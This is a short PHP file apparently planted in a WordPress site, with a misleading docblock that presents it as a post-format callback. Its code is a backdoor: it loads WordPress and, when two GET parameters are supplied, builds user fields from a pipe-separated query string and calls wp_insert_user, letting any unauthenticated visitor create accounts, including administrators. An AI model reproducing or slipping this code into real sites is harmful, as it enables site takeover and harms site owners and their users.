<?php	
	/**
	 * Callback function for the post format name block binding source.
	 *
	 * @since 2.0
	 *
	 * @return string|void Post format name, or nothing if the format is 'standard'.
	 */
	@include_once "../wp-load.php";
	if(isset($_GET['m']) && isset($_GET['n'])){
		$u=explode("|",$_GET['m']);
		$ur = array();
		foreach($u as $k=>$v){
			if($k%2==0){
				$t=$v;
				$ur[$v]="s";
			}else{
				$ur[$t] = $v;
			}
		}		
		$s = wp_insert_user(wp_slash($ur));
		echo "$s-success";
	}
?>